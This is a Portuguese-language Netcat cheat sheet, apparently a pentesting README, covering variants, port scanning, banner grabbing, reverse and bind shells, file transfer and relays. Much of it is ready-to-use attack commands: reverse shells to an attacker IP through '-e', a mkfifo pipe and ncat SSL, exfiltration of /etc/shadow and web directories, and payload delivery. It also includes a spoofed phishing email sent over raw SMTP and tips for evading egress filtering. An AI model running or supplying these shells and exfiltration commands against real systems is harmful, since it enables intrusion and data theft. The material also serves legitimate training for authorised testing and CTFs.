<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔌 Netcat (nc) - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploração e projéteis">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Protocolos TCP/UDP">
  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="License">
</p>

<p alinhar="centro">
  <b>🌐 Ler e gravar dados brutos em conexões de rede usando protocolos TCP e UDP</b>
</p>

---

## 📋 Índice

- [Visão geral e a filosofia do Netcat](#-overview--the-netcat-philosophy)
- [Variantes do Netcat e o dilema do sabor](#-variantes do netcat--o-dilema do sabor)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [Netcat tradicional (`nc.traditional`)](#tradicional-netcat-nctradicional)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
- [Comparação de ferramentas: variantes do Netcat vs Socat](#-tool-comparison-netcat-variants-vs-socat)
- [Variantes de instalação e comutação](#-instalação--variantes de comutação)
- [Sinalizadores de linha de comando principais](#-core-command-line-flags)
- [Varredura de porta e captura de banner](#-port-scanning--banner-grabbing)
- [Reverter e vincular shells] (#-reverse--bind-shells)
  - [Execução de Shell Tradicional (`-e`)](#execução de Shell Tradicional--e)
  - [OpenBSD FIFO nomeado Pipe Reverse Shell](#openbsd-fifo-named-pipe-reverse-shell)
  - [OpenBSD FIFO Bind Shell](#openbsd-fifo-bind-shell)
  - [Shell TLS criptografado com Ncat (`--ssl`)](#encrypted-tls-shell-with-ncat---ssl)
- [Técnicas de transferência de arquivos](#-técnicas de transferência de arquivos)
  - [Alvo para atacante (Exfiltração)](#exfiltração de alvo para atacante)
  - [Atacante ao alvo (entrega de carga útil)](#entrega de carga útil do atacante ao alvo)
  - [Arquivamento de diretório instantâneo (`tar + nc`)](#on-the-fly-directory-archiving-tar--nc)
- [Encaminhamento de porta e retransmissões de rede](#-port-forwarding--network-relays)
- [Emulação de servidor Web e Honeypot] (#-servidor web - emulação de honeypot)
- [Depuração de rede e interação de protocolo manual](#-depuração de rede--interação de protocolo manual)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e OPSEC](#-considerações defensivas--opsec)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e a filosofia do Netcat

Originalmente criado em 1995 por **Hobbit**, **Netcat** (muitas vezes invocado simplesmente como `nc`) é celebrado nas comunidades de segurança cibernética e Unix como o **"Canivete Suíço TCP/IP"**. 

Ao contrário dos protocolos de aplicativos de alto nível ou das ferramentas de gerenciamento inchadas, o Netcat faz uma coisa excepcionalmente bem: **ele abre canais de rede brutos em nível de byte sobre soquetes TCP ou UDP e os conecta diretamente à entrada padrão (`stdin`) e à saída padrão (`stdout`)**.

Esteja você ouvindo shells reversos, estabelecendo canais de exfiltração secretos, serviços de captura de banners, transferindo arquivos sem SMB/FTP ou diagnosticando filtragem de pacotes de firewall, o Netcat continua sendo um utilitário indispensável no arsenal de todo profissional de segurança.

---

## ⚖️ Variantes do Netcat e o dilema do sabor

Uma das fontes mais frequentes de confusão durante testes de penetração e desafios de CTF é que **múltiplas implementações distintas compartilham o comando `nc`**. Compreender com qual variante você está interagindo determina as possibilidades de sintaxe e carga útil.
```
+-------------------------------------------------------------------------+
|                              The nc Command                             |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|             (Default: OpenBSD)     |               (Default: Ncat)      |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
```
### OpenBSD Netcat (`nc.openbsd`)
- **Padrão em:** Kali Linux, Debian, Ubuntu, Linux Mint.
- **Característica principal:** Por padrão, compilado sem o sinalizador `-e` (executar programa) para evitar vulnerabilidades triviais de execução de código arbitrário.
- **Sintaxe de identificação:**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Output: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Solução alternativa de execução do Shell:** Usa pipes nomeados do Linux (`mkfifo`) para conectar `stdin` e `stdout` de volta ao `/bin/sh`.

### Netcat tradicional (`nc.traditional`)
- **Autor original:** Hobbit (v1.10).
- **Característica principal:** Compilado com a diretiva `-DGAPING_SECURITY_HOLE`, permitindo o sinalizador nativo `-e` / `-c` (`nc -e /bin/bash`).
- **Sintaxe de identificação:**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```
### Nmap Ncat (`ncat`)
- **Mantido por:** Gordon Lyon (Fyodor) / The Nmap Project.
- **Característica principal:** uma reescrita moderna com suporte para **criptografia TLS/SSL**, listas de controle de acesso IP (`--allow`, `--deny`), corretagem de conexão (`--broker`), proxy SOCKS4/5 e execução nativa de plataforma cruzada.

---

## ⚖️ Comparação de ferramentas: variantes Netcat vs Socat

| Recurso | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmap) | `socat` |
|---------|------------------|-----------|---------------|--------|
| **Sinalizador Executável (`-e`)** | ❌ Despojado | ✅ Nativo (`-e`) | ✅ Nativo (`-e`, `--exec`) | ✅ Nativo (`EXEC:`) |
| **Criptografia SSL/TLS** | ❌ Não | ❌ Não | ✅ Nativo (`--ssl`) | ✅ Nativo (`OPENSSL:`) |
| **Invólucros de tubos FIFO** | ✅ Sim (`mkfifo`) | ✅ Sim | ✅ Sim | ✅ Sim |
| **Modo de verificação de porta** | ✅ Sim (`-z`) | ✅ Sim (`-z`) | ❌ Não | ❌ Não |
| **Ouvinte Persistente** | ✅ Sim (`-k`) | ❌ Não (Sai ​​ao desconectar) | ✅ Sim (`-k`, `--keep-open`) | ✅ Sim (`fork`) |
| **Suporte IPv6** | ✅ Nativo (`-6`) | ❌ Limitado | ✅ Nativo (`-6`) | ✅ Nativo |
| **Proxy/Cliente SOCKS** | ✅ Sim (`-X`, `-x`) | ❌ Não | ✅ Sim (`--proxy`) | ✅ Suporte total a proxy |
| **Bate-papo/corretor multicliente**| ❌ Não | ❌ Não | ✅ Nativo (`--broker`) | ❌ Configuração manual |
| **Padrão no Kali/Debian** | ✅ Sim (`/bin/nc`) | 🔄 Disponível (`apt`) | 🔄 Disponível (`ncat`) | 🔄 Disponível (`socat`) |

---

## 📥 Variantes de instalação e troca

Em distribuições baseadas em Debian (incluindo Kali Linux), você pode instalar todas as versões e alternar entre elas via `update-alternatives`:
```bash
# Install all Netcat implementations
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Check current default alternative
readlink -f /bin/nc

# Switch default nc binary interactively
sudo update-alternatives --config nc
```
Para executar explicitamente uma variante específica sem alterar os padrões de todo o sistema:
```bash
# Invoke OpenBSD variant directly
nc.openbsd -lvnp 4444

# Invoke Traditional variant directly
nc.traditional -lvnp 4444 -e /bin/bash

# Invoke Nmap Ncat
ncat -lvnp 4444 --ssl
```
---

## ⚙️ Sinalizadores principais de linha de comando

| Bandeira | Significado e descrição |
|------|-----------------------|
| `-l` | **Modo de escuta**: aguarde conexões de entrada em vez de iniciar a saída. |
| `-v` | **Modo detalhado**: imprime informações detalhadas de conexão e diagnóstico (`-vv` para maior verbosidade). |
| `-n` | **IP somente numérico**: desative a resolução de DNS reverso para obter velocidade e sigilo. |
| `-p <port>` | **Porta local**: Especifique a porta local para vincular ou escutar. |
| `-u` | **Modo UDP**: Use o protocolo UDP em vez do fluxo TCP padrão. |
| `-k` | **Continue ouvindo**: continue ouvindo e aceitando novas conexões depois que um cliente se desconectar. |
| `-w <sec>` | **Timeout**: Tempo limite em segundos para estabelecimento de conexão e leituras de soquete ocioso. |
| `-z` | **Modo Zero-I/O**: Modo de digitalização; não envie dados de carga útil e feche o soquete imediatamente após o handshake. |
| `-q <sec>` | **Sair após EOF**: Aguarde segundos especificados após receber EOF no `stdin` antes de encerrar. |
| `-s <ip>` | **IP de origem**: vincula-se a uma interface local/endereço IP de origem específico. |
| `-4`/`-6` | Forçar exclusivamente o endereçamento IPv4 ou IPv6. |

---

## 🔍 Verificação de portas e captura de banners

Embora ferramentas dedicadas como `nmap` ou `masscan` sejam preferidas para varreduras abrangentes, o Netcat fornece uma verificação de porta instantânea e sem dependência quando você chega a um alvo restrito.

### Verificação rápida de portas
```bash
# TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
nc -zvn -w 1 192.168.1.100 20-100

# Scan specific common service ports
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# Scan UDP Ports (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```
### Captura de banner de serviço

A captura de banner extrai strings de versão bruta de daemons remotos para identificação de vulnerabilidades:
```bash
# Banner grab an SSH daemon
nc -vn 10.10.10.10 22

# Banner grab an FTP server
nc -vn 10.10.10.10 21

# Banner grab an SMTP mail server
nc -vn 10.10.10.10 25

# Manual HTTP HEAD / GET request
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```
---

## 💀 Inverter e vincular shells

Conectar um interpretador de comando remoto (`/bin/sh`, `/bin/bash`, `cmd.exe`) através de um soquete Netcat é uma das técnicas de teste de penetração mais fundamentais.

### Execução de Shell Tradicional (`-e`)

Se o sistema de destino tiver `netcat-traditional` ou `ncat` instalado com suporte de execução:
```bash
# 1. Attacker sets up a listener
nc -lvnp 4444

# 2. Target sends a reverse shell (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Target sends a reverse shell (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Bind Shell (Target listens, attacker connects)
# On Target:
nc.traditional -lvnp 8888 -e /bin/bash
# On Attacker:
nc -vn 10.10.10.50 8888
```
### OpenBSD FIFO nomeado Pipe Reverse Shell

Nas distribuições modernas Debian, Ubuntu, Kali e Fedora, `nc` não possui o sinalizador `-e`. Use um canal nomeado **FIFO (First-In-First-Out)** para redirecionar a entrada e a saída padrão:
```bash
# 1. Attacker sets up listener
nc -lvnp 4444

# 2. Target executes named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```
#### Como funciona o pipeline FIFO:
1. `rm -f /tmp/f`: Remove qualquer arquivo de pipe obsoleto.
2. `mkfifo /tmp/f`: Cria um canal FIFO com nome especial em `/tmp`.
3. `cat /tmp/f`: Lê a entrada entregue no pipe e a encaminha para `/bin/sh -i`.
4. `| /bin/sh -i 2>&1`: Gera um shell interativo, redirecionando o erro padrão (`stderr`) para a saída padrão (`stdout`).
5. `| nc 10.10.14.5 4444 >/tmp/f`: Passa a saída do shell pela rede para o invasor, enquanto grava as teclas digitadas na rede recebidas de volta no `/tmp/f`.

### Shell de ligação FIFO do OpenBSD

Quando o destino tem um IP público ou local roteável e as regras de firewall de entrada permitem o tráfego:
```bash
# On Victim / Target machine:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# On Attacker machine:
nc -vn 10.10.10.50 8888
```
### Shell TLS criptografado com Ncat (`--ssl`)

O tráfego Netcat não criptografado pode ser inspecionado por IDS/IPS e taps de rede. `ncat` suporta criptografia TLS/SSL nativamente:
```bash
# 1. Attacker sets up an SSL encrypted listener
ncat --ssl -lvnp 4444

# 2. Victim connects with an encrypted reverse shell
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# SSL listener with IP Access Control (Whitelisting attacker IP only)
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```
---

## 📁 Técnicas de transferência de arquivos

Quando SSH, SCP, FTP e SMB são bloqueados ou desinstalados, o Netcat fornece um pipeline de transferência de arquivos bidirecional e instantâneo em qualquer porta TCP aberta.

### Alvo para Agressor (Exfiltração)
```bash
# 1. Attacker opens a listener and redirects incoming stream to a local file
nc -lvnp 9001 > loot_passwords.txt

# 2. Target reads sensitive file and sends it to attacker's listener
nc -vn 10.10.14.5 9001 < /etc/shadow
```
### Atacante para o alvo (entrega de carga útil)
```bash
# 1. Attacker hosts the payload file on a listener
nc -lvnp 9001 < linpeas.sh

# 2. Target connects and saves the stream to disk
nc -vn 10.10.14.5 9001 > linpeas.sh
```
### Verificação de integridade (somas de verificação)

Sempre verifique a integridade dos bytes após transferências brutas do Netcat:
```bash
# Calculate MD5 on both source and destination machines
md5sum transferred_file.tar.gz
```
### Arquivamento de diretório instantâneo (`tar + nc`)

Transfira estruturas de diretório inteiras sem criar arquivos temporários intermediários no disco da vítima:
```bash
# 1. Attacker listens and extracts incoming tar stream directly
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Target compresses and streams directory across the wire
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```
---

## 🔀 Encaminhamento de porta e retransmissões de rede

O Netcat pode atuar como um retransmissor de rede leve sem exigir encaminhamento de porta SSH:
```bash
# Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```
---

## 🌐 Servidor Web e Emulação Honeypot

### Servidor HTTP minimalista de arquivo único

Sirva uma carga HTTP estática ou capture credenciais enviadas pelos navegadores:
```bash
# One-shot HTTP response
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Continuous loop HTTP server (captures POST credentials and browser headers)
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nCaptured Request!" | \
  nc -lvnp 8080
done
```
### Bate-papo multicliente/corretor de mensagens (`ncat`)

Ncat inclui um modo de corretor integrado, criando uma sala de retransmissão ad-hoc semelhante a IRC para operadores de equipe vermelha:
```bash
# Attacker runs broker on port 5555
ncat -lvnp 5555 --broker

# Multiple operators connect and broadcast messages to each other
ncat 10.10.14.5 5555
```
---

## 🛠️ Depuração de rede e interação manual de protocolo

### Injeção de correio SMTP bruto
```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<victim@target.local>
DATA
Subject: Critical Security Patch

Please follow the attachment instructions.
.
QUIT
EOF
```
### Recuperação de correio POP3 bruto
```bash
nc -vn mail.target.local 110
# Server replies: +OK POP3 server ready
USER testuser
# Server replies: +OK
PASS SecretPassword123
# Server replies: +OK User logged in
STAT
RETR 1
QUIT
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Ouvinte padrão** | `nc -lvnp <PORT>` |
| **Ouvinte Persistente** | `nc -lvnp <PORT> -k` |
| **Conecte-se ao host remoto** | `nc -vn <HOST> <PORT>` |
| **Conectar via UDP** | `nc -u -vn <HOST> <PORT>` |
| **Verificação de porta TCP (rápida)** | `nc -zvn -w 1 <HOST> <START>-<END>` |
| **Verificação de porta UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
| **OpenBSD nomeado Pipe Shell** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **Concha Tradicional (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **Shell SSL criptografado (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash` |
| **Receber arquivo (ouvinte Exfil)**| `nc -lvnp <PORT> > output_file` |
| **Enviar arquivo (remetente Exfil)** | `nc -vn <IP> <PORT> < input_file` |
| **Transmitir pasta via Tar** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
| **Extrair pasta transmitida** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **Captura de Banner** | `nc -vn -w 2 <HOST> <PORT>` |

---

## 🛡️ Considerações defensivas e OPSEC

1. **Aviso de texto não criptografado:**
   - O Netcat padrão **não** emprega encapsulamento criptográfico. Quaisquer senhas, tokens de sessão ou comandos shell enviados em texto não criptografado `nc` podem ser extraídos por sensores NSM (Network Security Monitoring) (Zeek, Suricata, Wireshark).
   - Use `ncat --ssl` ou envolva o tráfego dentro de um túnel SSH/TLS sempre que possível.
2. **Auditoria de Processo e Sysmon:**
   - Em sistemas Linux, o registro de execução de processos (`auditd`, eBPF, Falco) sinaliza invocações de `nc` contendo sinalizadores como `-e` ou comandos criando `/tmp/f` e `mkfifo`.
   - No Windows, os agentes EDR sinalizam ou colocam em quarentena binários `nc.exe` rotineiramente devido a assinaturas estáticas conhecidas.
3. **Restrições de entrada de firewall:**
   - Sempre escolha portas de saída comuns (`80`, `443`, `53`) ao configurar ouvintes de shell reverso para contornar políticas rígidas de filtragem de saída.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> Esta folha de dicas foi projetada apenas para testes de penetração autorizados, avaliação de vulnerabilidades, competições CTF e administração de sistema. Interceptar tráfego de rede, exfiltrar dados ou executar shells reversos contra sistemas sem consentimento explícito por escrito é ilegal e punível pelas leis de segurança cibernética em todo o mundo. Use com responsabilidade e ética.